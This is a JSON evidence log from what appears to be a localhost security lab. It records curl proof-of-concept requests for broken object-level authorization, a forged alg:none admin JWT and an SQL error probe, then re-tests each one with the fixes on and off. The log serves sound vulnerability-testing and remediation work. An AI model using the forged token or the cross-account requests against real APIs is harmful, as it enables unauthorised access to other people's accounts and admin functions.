@@ -1,0 +1,669 @@
+{
+  "schema": "cyberlab.lab.evidence/1",
+  "labId": "lab-owasp-api-bola",
+  "baseUrl": "http://127.0.0.1:35021",
+  "suite": "E1-E7",
+  "tool": "CyberLab OS linux/x64 — bun 1.4.4",
+  "generatedAt": "2026-11-04T12:59:04.868Z",
+  "configAtStart": {
+    "enforceAccountOwnership": false,
+    "rejectAlgNoneJwt": false,
+    "sanitizeSqlQuery": false,
+    "enableSecurityHeaders": false
+  },
+  "configAtEnd": {
+    "enforceAccountOwnership": false,
+    "rejectAlgNoneJwt": false,
+    "sanitizeSqlQuery": false,
+    "enableSecurityHeaders": false
+  },
+  "cases": [
+    {
+      "id": "E1-01-baseline-own-account",
+      "experimentId": "E1",
+      "label": "User A lendo a PRÓPRIA conta (baseline positivo)",
+      "command": "curl -s -i -H \"Authorization: Bearer token-user-a-1001\" http://127.0.0.1:35021/api/v1/accounts/1001",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/accounts/1001",
+      "requestHeaders": {
+        "Authorization": "Bearer token-user-a-1001"
+      },
+      "expectation": "200 com dados de alice@corp.lab (prova que o endpoint funciona).",
+      "status": 200,
+      "statusText": "OK",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\n  \"accountId\": \"1001\",\n  \"owner\": \"alice@corp.lab\",\n  \"balanceUsd\": 1250\n}",
+      "durationMs": 6,
+      "capturedAt": "2026-11-04T12:59:04.859Z",
+      "file": "E1-01-baseline-own-account.txt",
+      "sha256": "16257efbdd35a80bcc2e452a1160a2a8e6086f9a4a623936a6f9cd40066916dd",
+      "bytes": 702
+    },
+    {
+      "id": "E1-02-poc-cross-account",
+      "experimentId": "E1",
+      "label": "User A lendo a conta do User B (PoC de BOLA)",
+      "command": "curl -s -i -H \"Authorization: Bearer token-user-a-1001\" http://127.0.0.1:35021/api/v1/accounts/1002",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/accounts/1002",
+      "requestHeaders": {
+        "Authorization": "Bearer token-user-a-1001"
+      },
+      "expectation": "403 se o controle de titularidade existisse; 200 com bolaFlag se vulnerável.",
+      "status": 200,
+      "statusText": "OK",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\n  \"accountId\": \"1002\",\n  \"owner\": \"bob@corp.lab\",\n  \"balanceUsd\": 94500,\n  \"bolaFlag\": \"LAB{BOLA_CROSS_ACCOUNT_EXPOSED}\"\n}",
+      "durationMs": 1,
+      "capturedAt": "2026-11-04T12:59:04.860Z",
+      "file": "E1-02-poc-cross-account.txt",
+      "sha256": "255b601df38636a2ad18662650768e20e9ac094e5efae51432fa082567eab426",
+      "bytes": 755
+    },
+    {
+      "id": "E1-03-control-owner-reads-own",
+      "experimentId": "E1",
+      "label": "Controle — User B lendo a PRÓPRIA conta (isola o token como variável)",
+      "command": "curl -s -i -H \"Authorization: Bearer token-user-b-1002\" http://127.0.0.1:35021/api/v1/accounts/1002",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/accounts/1002",
+      "requestHeaders": {
+        "Authorization": "Bearer token-user-b-1002"
+      },
+      "expectation": "200 — prova que a diferença em E1-02 vem do token, não do ID.",
+      "status": 200,
+      "statusText": "OK",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\n  \"accountId\": \"1002\",\n  \"owner\": \"bob@corp.lab\",\n  \"balanceUsd\": 94500\n}",
+      "durationMs": 0,
+      "capturedAt": "2026-11-04T12:59:04.860Z",
+      "file": "E1-03-control-owner-reads-own.txt",
+      "sha256": "40af37f081d14d00ef2612003358e62e868e3ce059ecd117d15b0b65d984d1b6",
+      "bytes": 729
+    },
+    {
+      "id": "E2-01-anon-own-account",
+      "experimentId": "E2",
+      "label": "Baseline — sem credencial na conta 1001",
+      "command": "curl -s -i http://127.0.0.1:35021/api/v1/accounts/1001",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/accounts/1001",
+      "requestHeaders": {},
+      "expectation": "401/403 se autenticação fosse obrigatória; 200 com dados se não.",
+      "status": 200,
+      "statusText": "OK",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\n  \"accountId\": \"1001\",\n  \"owner\": \"alice@corp.lab\",\n  \"balanceUsd\": 1250\n}",
+      "durationMs": 1,
+      "capturedAt": "2026-11-04T12:59:04.861Z",
+      "file": "E2-01-anon-own-account.txt",
+      "sha256": "96ebf8dfb4b0a2b848a87501092f9380b87087c067f680f12e0d614bc1e1e795",
+      "bytes": 609
+    },
+    {
+      "id": "E2-02-anon-other-account",
+      "experimentId": "E2",
+      "label": "PoC — sem credencial na conta 1002",
+      "command": "curl -s -i http://127.0.0.1:35021/api/v1/accounts/1002",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/accounts/1002",
+      "requestHeaders": {},
+      "expectation": "401/403 se autenticação fosse obrigatória; 200 com dados se não.",
+      "status": 200,
+      "statusText": "OK",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\n  \"accountId\": \"1002\",\n  \"owner\": \"bob@corp.lab\",\n  \"balanceUsd\": 94500,\n  \"bolaFlag\": \"LAB{BOLA_CROSS_ACCOUNT_EXPOSED}\"\n}",
+      "durationMs": 0,
+      "capturedAt": "2026-11-04T12:59:04.861Z",
+      "file": "E2-02-anon-other-account.txt",
+      "sha256": "2f7a5c3b59f9574718ae6eaeccd36070d4bfb6f7d4e1c5cb0d1136bfefdd0043",
+      "bytes": 654
+    },
+    {
+      "id": "E3-01-no-token",
+      "experimentId": "E3",
+      "label": "Baseline — endpoint admin sem token",
+      "command": "curl -s -i http://127.0.0.1:35021/api/v1/admin/debug",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/admin/debug",
+      "requestHeaders": {},
+      "expectation": "401 (o endpoint exige alguma credencial).",
+      "status": 401,
+      "statusText": "Unauthorized",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\n  \"error\": \"Valid signed admin JWT required\"\n}",
+      "durationMs": 0,
+      "capturedAt": "2026-11-04T12:59:04.861Z",
+      "file": "E3-01-no-token.txt",
+      "sha256": "ad0748d1b13109f546399835f3420b07e005afbbe9718ebce74eb66f4735ed36",
+      "bytes": 548
+    },
+    {
+      "id": "E3-02-opaque-token",
+      "experimentId": "E3",
+      "label": "Baseline — token opaco não-JWT",
+      "command": "curl -s -i -H \"Authorization: Bearer token-user-a-1001\" http://127.0.0.1:35021/api/v1/admin/debug",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/admin/debug",
+      "requestHeaders": {
+        "Authorization": "Bearer token-user-a-1001"
+      },
+      "expectation": "401 (token sem role=admin não deve bastar).",
+      "status": 401,
+      "statusText": "Unauthorized",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\n  \"error\": \"Valid signed admin JWT required\"\n}",
+      "durationMs": 1,
+      "capturedAt": "2026-11-04T12:59:04.862Z",
+      "file": "E3-02-opaque-token.txt",
+      "sha256": "42b124b9d741485c04b523cdf3d052880e1898a81efe916a414c1d993dd37efe",
+      "bytes": 636
+    },
+    {
+      "id": "E3-03-poc-alg-none",
+      "experimentId": "E3",
+      "label": "PoC — JWT forjado com alg:none e role=admin",
+      "command": "curl -s -i -H \"Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyLTEwMDEiLCJyb2xlIjoiYWRtaW4ifQ.\" http://127.0.0.1:35021/api/v1/admin/debug",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/admin/debug",
+      "requestHeaders": {
+        "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyLTEwMDEiLCJyb2xlIjoiYWRtaW4ifQ."
+      },
+      "expectation": "401 se a assinatura fosse verificada; 200 com LAB{JWT_ALG_NONE_ACCEPTED} se não.",
+      "status": 200,
+      "statusText": "OK",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\n  \"adminAccess\": true,\n  \"flag\": \"LAB{JWT_ALG_NONE_ACCEPTED}\"\n}",
+      "durationMs": 0,
+      "capturedAt": "2026-11-04T12:59:04.862Z",
+      "file": "E3-03-poc-alg-none.txt",
+      "sha256": "a87cb8e2ee36296a922701f278fa3a350f5ca6d7d62eebd7a6e201db559d6791",
+      "bytes": 824
+    },
+    {
+      "id": "E4-01-benign-query",
+      "experimentId": "E4",
+      "label": "Baseline — consulta benigna",
+      "command": "curl -s -i \"http://127.0.0.1:35021/api/v1/search?q=test\"",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/search?q=test",
+      "requestHeaders": {},
+      "expectation": "200 com resultados.",
+      "status": 200,
+      "statusText": "OK",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\n  \"query\": \"test\",\n  \"results\": [\n    {\n      \"id\": \"tx-01\",\n      \"memo\": \"Lab transfer\",\n      \"amount\": 42\n    }\n  ]\n}",
+      "durationMs": 0,
+      "capturedAt": "2026-11-04T12:59:04.862Z",
+      "file": "E4-01-benign-query.txt",
+      "sha256": "985e2182aef8a5def1114c1b096f3dda43fbfdb4195a8140923d870c02f5f6ea",
+      "bytes": 593
+    },
+    {
+      "id": "E4-02-poc-single-quote",
+      "experimentId": "E4",
+      "label": "PoC — aspa simples (%27) no parâmetro q",
+      "command": "curl -s -i \"http://127.0.0.1:35021/api/v1/search?q=%27\"",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/search?q=%27",
+      "requestHeaders": {},
+      "expectation": "Erro genérico SEM estrutura da consulta; 500 com SQLITE_ERROR se vulnerável.",
+      "status": 500,
+      "statusText": "Internal Server Error",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "text/plain; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "SQLITE_ERROR: near \"'\": syntax error in SELECT id, amount FROM ledger WHERE memo LIKE '%'%'",
+      "durationMs": 1,
+      "capturedAt": "2026-11-04T12:59:04.863Z",
+      "file": "E4-02-poc-single-quote.txt",
+      "sha256": "1ef017ad901ad0d93fc102757d26aebee2cb3db0f63d31b35549694b8082f58e",
+      "bytes": 648
+    },
+    {
+      "id": "E5-01-header-baseline",
+      "experimentId": "E5",
+      "label": "Baseline — headers de segurança na resposta autenticada",
+      "command": "curl -s -D - -o NUL -H \"Authorization: Bearer token-user-a-1001\" http://127.0.0.1:35021/api/v1/accounts/1001",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/accounts/1001",
+      "requestHeaders": {
+        "Authorization": "Bearer token-user-a-1001"
+      },
+      "expectation": "CSP, HSTS, X-Frame-Options e X-Content-Type-Options presentes.",
+      "status": 200,
+      "statusText": "OK",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\n  \"accountId\": \"1001\",\n  \"owner\": \"alice@corp.lab\",\n  \"balanceUsd\": 1250\n}",
+      "durationMs": 0,
+      "capturedAt": "2026-11-04T12:59:04.863Z",
+      "file": "E5-01-header-baseline.txt",
+      "sha256": "1b1ef3c42c6a7e85058e5b80918d67e2a87e9ae3e50cb466fc6705538ad600de",
+      "bytes": 713
+    },
+    {
+      "id": "E6-01-bola",
+      "experimentId": "E6",
+      "label": "H1 — BOLA (remediado)",
+      "command": "curl -s -o NUL -w \"%{http_code}\" -H \"Authorization: Bearer token-user-a-1001\" http://127.0.0.1:35021/api/v1/accounts/1002",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/accounts/1002",
+      "requestHeaders": {
+        "Authorization": "Bearer token-user-a-1001"
+      },
+      "expectation": "Após ligar os 4 controles: 403 esperado.",
+      "status": 403,
+      "statusText": "Forbidden",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-security-policy": "default-src 'none'; frame-ancestors 'none'",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "strict-transport-security": "max-age=63072000; includeSubDomains; preload",
+        "transfer-encoding": "chunked",
+        "x-content-type-options": "nosniff",
+        "x-frame-options": "DENY"
+      },
+      "body": "{\n  \"error\": \"Forbidden: BOLA ownership check blocked cross-account access\"\n}",
+      "durationMs": 1,
+      "capturedAt": "2026-11-04T12:59:04.864Z",
+      "file": "E6-01-bola.txt",
+      "sha256": "42e1a2414b38b4fe887020bb7642414155c82649838a6f7d93a042455093690a",
+      "bytes": 861
+    },
+    {
+      "id": "E6-02-alg-none",
+      "experimentId": "E6",
+      "label": "H2 — JWT alg:none (remediado)",
+      "command": "curl -s -o NUL -w \"%{http_code}\" -H \"Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyLTEwMDEiLCJyb2xlIjoiYWRtaW4ifQ.\" http://127.0.0.1:35021/api/v1/admin/debug",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/admin/debug",
+      "requestHeaders": {
+        "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyLTEwMDEiLCJyb2xlIjoiYWRtaW4ifQ."
+      },
+      "expectation": "Após ligar rejectAlgNoneJwt: 401 esperado.",
+      "status": 401,
+      "statusText": "Unauthorized",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-security-policy": "default-src 'none'; frame-ancestors 'none'",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "strict-transport-security": "max-age=63072000; includeSubDomains; preload",
+        "transfer-encoding": "chunked",
+        "x-content-type-options": "nosniff",
+        "x-frame-options": "DENY"
+      },
+      "body": "{\n  \"error\": \"Valid signed admin JWT required\"\n}",
+      "durationMs": 0,
+      "capturedAt": "2026-11-04T12:59:04.864Z",
+      "file": "E6-02-alg-none.txt",
+      "sha256": "2abfe27d4fe4e700cf9bcb76c31c52da5b9c6a3e0ebc1ce1b96a48abe7e024b5",
+      "bytes": 977
+    },
+    {
+      "id": "E6-03-sql-error",
+      "experimentId": "E6",
+      "label": "H3 — erro SQL (remediado)",
+      "command": "curl -s -o NUL -w \"%{http_code}\" \"http://127.0.0.1:35021/api/v1/search?q=%27\"",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/search?q=%27",
+      "requestHeaders": {},
+      "expectation": "Após ligar sanitizeSqlQuery: 200 SEM SQLITE_ERROR esperado.",
+      "status": 200,
+      "statusText": "OK",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-security-policy": "default-src 'none'; frame-ancestors 'none'",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "strict-transport-security": "max-age=63072000; includeSubDomains; preload",
+        "transfer-encoding": "chunked",
+        "x-content-type-options": "nosniff",
+        "x-frame-options": "DENY"
+      },
+      "body": "{\n  \"query\": \"'\",\n  \"results\": [\n    {\n      \"id\": \"tx-01\",\n      \"memo\": \"Lab transfer\",\n      \"amount\": 42\n    }\n  ]\n}",
+      "durationMs": 1,
+      "capturedAt": "2026-11-04T12:59:04.865Z",
+      "file": "E6-03-sql-error.txt",
+      "sha256": "daeb1896231d07f3543776fac7e1040452b05fc9eb4251da185e5ee36a2e9c6e",
+      "bytes": 840
+    },
+    {
+      "id": "E6-04-headers",
+      "experimentId": "E6",
+      "label": "H4 — headers de segurança (remediado)",
+      "command": "curl -s -D - -o NUL -H \"Authorization: Bearer token-user-a-1001\" http://127.0.0.1:35021/api/v1/accounts/1001",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/accounts/1001",
+      "requestHeaders": {
+        "Authorization": "Bearer token-user-a-1001"
+      },
+      "expectation": "Após ligar enableSecurityHeaders: os 4 headers presentes.",
+      "status": 200,
+      "statusText": "OK",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-security-policy": "default-src 'none'; frame-ancestors 'none'",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "strict-transport-security": "max-age=63072000; includeSubDomains; preload",
+        "transfer-encoding": "chunked",
+        "x-content-type-options": "nosniff",
+        "x-frame-options": "DENY"
+      },
+      "body": "{\n  \"accountId\": \"1001\",\n  \"owner\": \"alice@corp.lab\",\n  \"balanceUsd\": 1250\n}",
+      "durationMs": 0,
+      "capturedAt": "2026-11-04T12:59:04.865Z",
+      "file": "E6-04-headers.txt",
+      "sha256": "f354328e92563d33a09df77d9a00ff5f16ab83e6994e065f5987702794010676",
+      "bytes": 877
+    },
+    {
+      "id": "E7-01-bola",
+      "experimentId": "E7",
+      "label": "H1 — BOLA (restaurado)",
+      "command": "curl -s -o NUL -w \"%{http_code}\" -H \"Authorization: Bearer token-user-a-1001\" http://127.0.0.1:35021/api/v1/accounts/1002",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/accounts/1002",
+      "requestHeaders": {
+        "Authorization": "Bearer token-user-a-1001"
+      },
+      "expectation": "Após desligar os 4 controles novamente: volta a 200 (estado vulnerável).",
+      "status": 200,
+      "statusText": "OK",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\n  \"accountId\": \"1002\",\n  \"owner\": \"bob@corp.lab\",\n  \"balanceUsd\": 94500,\n  \"bolaFlag\": \"LAB{BOLA_CROSS_ACCOUNT_EXPOSED}\"\n}",
+      "durationMs": 0,
+      "capturedAt": "2026-11-04T12:59:04.865Z",
+      "file": "E7-01-bola.txt",
+      "sha256": "a84e6890f352642eef9c42ff777bbd06b04f50fe143053e0fa1e47463d256d17",
+      "bytes": 741
+    },
+    {
+      "id": "E7-02-alg-none",
+      "experimentId": "E7",
+      "label": "H2 — JWT alg:none (restaurado)",
+      "command": "curl -s -o NUL -w \"%{http_code}\" -H \"Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyLTEwMDEiLCJyb2xlIjoiYWRtaW4ifQ.\" http://127.0.0.1:35021/api/v1/admin/debug",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/admin/debug",
+      "requestHeaders": {
+        "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyLTEwMDEiLCJyb2xlIjoiYWRtaW4ifQ."
+      },
+      "expectation": "Após desligar rejectAlgNoneJwt: volta a 200 (estado vulnerável).",
+      "status": 200,
+      "statusText": "OK",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\n  \"adminAccess\": true,\n  \"flag\": \"LAB{JWT_ALG_NONE_ACCEPTED}\"\n}",
+      "durationMs": 1,
+      "capturedAt": "2026-11-04T12:59:04.866Z",
+      "file": "E7-02-alg-none.txt",
+      "sha256": "7dc28feefb79e3a620c2c1eb988cf12f95720d8c9f5a424918e8bf3699c1bb89",
+      "bytes": 814
+    },
+    {
+      "id": "E7-03-sql-error",
+      "experimentId": "E7",
+      "label": "H3 — erro SQL (restaurado)",
+      "command": "curl -s -o NUL -w \"%{http_code}\" \"http://127.0.0.1:35021/api/v1/search?q=%27\"",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/search?q=%27",
+      "requestHeaders": {},
+      "expectation": "Após desligar sanitizeSqlQuery: volta a 500 com SQLITE_ERROR (estado vulnerável).",
+      "status": 500,
+      "statusText": "Internal Server Error",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "text/plain; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "SQLITE_ERROR: near \"'\": syntax error in SELECT id, amount FROM ledger WHERE memo LIKE '%'%'",
+      "durationMs": 1,
+      "capturedAt": "2026-11-04T12:59:04.867Z",
+      "file": "E7-03-sql-error.txt",
+      "sha256": "1602a8344f74639a2c693a297eb6a5eeb299b8d8f0f1c96c9a8fd9993847245f",
+      "bytes": 654
+    },
+    {
+      "id": "E7-04-headers",
+      "experimentId": "E7",
+      "label": "H4 — headers de segurança (restaurado)",
+      "command": "curl -s -D - -o NUL -H \"Authorization: Bearer token-user-a-1001\" http://127.0.0.1:35021/api/v1/accounts/1001",
+      "method": "GET",
+      "url": "http://127.0.0.1:35021/api/v1/accounts/1001",
+      "requestHeaders": {
+        "Authorization": "Bearer token-user-a-1001"
+      },
+      "expectation": "Após desligar enableSecurityHeaders: os 4 headers ausentes novamente.",
+      "status": 200,
+      "statusText": "OK",
+      "responseHeaders": {
+        "connection": "keep-alive",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 04 Nov 2026 12:59:04 GMT",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\n  \"accountId\": \"1001\",\n  \"owner\": \"alice@corp.lab\",\n  \"balanceUsd\": 1250\n}",
+      "durationMs": 1,
+      "capturedAt": "2026-11-04T12:59:04.868Z",
+      "file": "E7-04-headers.txt",
+      "sha256": "1af7c31f3d401d6f4cc202ae07162768626e81fe508d28824b401bc2ce2cb8da",
+      "bytes": 696
+    }
+  ],
+  "verdicts": {
+    "H1": {
+      "verdict": "vulneravel",
+      "rationale": "E1-02 retornou 200 com o corpo de bob@corp.lab e bolaFlag (esperado 403). E1-01 e E1-03 confirmam que o endpoint funciona e que a variável é o token."
+    },
+    "H2": {
+      "verdict": "vulneravel",
+      "rationale": "E3-03 retornou 200 com flag LAB{JWT_ALG_NONE_ACCEPTED} (esperado 401). E3-01/E3-02 provam que o endpoint recusa ausência de token e token sem role=admin."
+    },
+    "H3": {
+      "verdict": "vulneravel",
+      "rationale": "E4-02 retornou 500 ecoando SQLITE_ERROR e a estrutura da consulta (esperado erro genérico). E4-01 confirma 200 com q benigno."
+    },
+    "H4": {
+      "verdict": "vulneravel",
+      "rationale": "E5-01: ausentes → content-security-policy, strict-transport-security, x-frame-options, x-content-type-options."
+    },
+    "H1@remediado": {
+      "verdict": "remediado",
+      "rationale": "E6-01-bola → HTTP 403, critério \"403\" atendido."
+    },
+    "H2@remediado": {
+      "verdict": "remediado",
+      "rationale": "E6-02-alg-none → HTTP 401, critério \"401/403\" atendido."
+    },
+    "H3@remediado": {
+      "verdict": "remediado",
+      "rationale": "E6-03-sql-error → HTTP 200, critério \"200 sem SQLITE_ERROR\" atendido."
+    },
+    "H4@remediado": {
+      "verdict": "remediado",
+      "rationale": "E6-04-headers → HTTP 200, critério \"os 4 headers\" atendido."
+    }
+  },
+  "files": [
+    {
+      "path": "E1-01-baseline-own-account.txt",
+      "sha256": "16257efbdd35a80bcc2e452a1160a2a8e6086f9a4a623936a6f9cd40066916dd",
+      "bytes": 702
+    },
+    {
+      "path": "E1-02-poc-cross-account.txt",
+      "sha256": "255b601df38636a2ad18662650768e20e9ac094e5efae51432fa082567eab426",
+      "bytes": 755
+    },
+    {
+      "path": "E1-03-control-owner-reads-own.txt",
+      "sha256": "40af37f081d14d00ef2612003358e62e868e3ce059ecd117d15b0b65d984d1b6",
+      "bytes": 729
+    },
+    {
+      "path": "E2-01-anon-own-account.txt",
+      "sha256": "96ebf8dfb4b0a2b848a87501092f9380b87087c067f680f12e0d614bc1e1e795",
+      "bytes": 609
+    },
+    {
+      "path": "E2-02-anon-other-account.txt",
+      "sha256": "2f7a5c3b59f9574718ae6eaeccd36070d4bfb6f7d4e1c5cb0d1136bfefdd0043",
+      "bytes": 654
+    },
+    {
+      "path": "E3-01-no-token.txt",
+      "sha256": "ad0748d1b13109f546399835f3420b07e005afbbe9718ebce74eb66f4735ed36",
+      "bytes": 548
+    },
+    {
+      "path": "E3-02-opaque-token.txt",
+      "sha256": "42b124b9d741485c04b523cdf3d052880e1898a81efe916a414c1d993dd37efe",
+      "bytes": 636
+    },
+    {
+      "path": "E3-03-poc-alg-none.txt",
+      "sha256": "a87cb8e2ee36296a922701f278fa3a350f5ca6d7d62eebd7a6e201db559d6791",
+      "bytes": 824
+    },
+    {
+      "path": "E4-01-benign-query.txt",
+      "sha256": "985e2182aef8a5def1114c1b096f3dda43fbfdb4195a8140923d870c02f5f6ea",
+      "bytes": 593
+    },
+    {
+      "path": "E4-02-poc-single-quote.txt",
+      "sha256": "1ef017ad901ad0d93fc102757d26aebee2cb3db0f63d31b35549694b8082f58e",
+      "bytes": 648
+    },
+    {
+      "path": "E5-01-header-baseline.txt",
+      "sha256": "1b1ef3c42c6a7e85058e5b80918d67e2a87e9ae3e50cb466fc6705538ad600de",
+      "bytes": 713
+    },
+    {
+      "path": "E6-01-bola.txt",
+      "sha256": "42e1a2414b38b4fe887020bb7642414155c82649838a6f7d93a042455093690a",
+      "bytes": 861
+    },
+    {
+      "path": "E6-02-alg-none.txt",
+      "sha256": "2abfe27d4fe4e700cf9bcb76c31c52da5b9c6a3e0ebc1ce1b96a48abe7e024b5",
+      "bytes": 977
+    },
+    {
+      "path": "E6-03-sql-error.txt",
+      "sha256": "daeb1896231d07f3543776fac7e1040452b05fc9eb4251da185e5ee36a2e9c6e",
+      "bytes": 840
+    },
+    {
+      "path": "E6-04-headers.txt",
+      "sha256": "f354328e92563d33a09df77d9a00ff5f16ab83e6994e065f5987702794010676",
+      "bytes": 877
+    },
+    {
+      "path": "E7-01-bola.txt",
+      "sha256": "a84e6890f352642eef9c42ff777bbd06b04f50fe143053e0fa1e47463d256d17",
+      "bytes": 741
+    },
+    {
+      "path": "E7-02-alg-none.txt",
+      "sha256": "7dc28feefb79e3a620c2c1eb988cf12f95720d8c9f5a424918e8bf3699c1bb89",
+      "bytes": 814
+    },
+    {
+      "path": "E7-03-sql-error.txt",
+      "sha256": "1602a8344f74639a2c693a297eb6a5eeb299b8d8f0f1c96c9a8fd9993847245f",
+      "bytes": 654
+    },
+    {
+      "path": "E7-04-headers.txt",
+      "sha256": "1af7c31f3d401d6f4cc202ae07162768626e81fe508d28824b401bc2ce2cb8da",
+      "bytes": 696
+    }
+  ],
+  "seal": null
+}
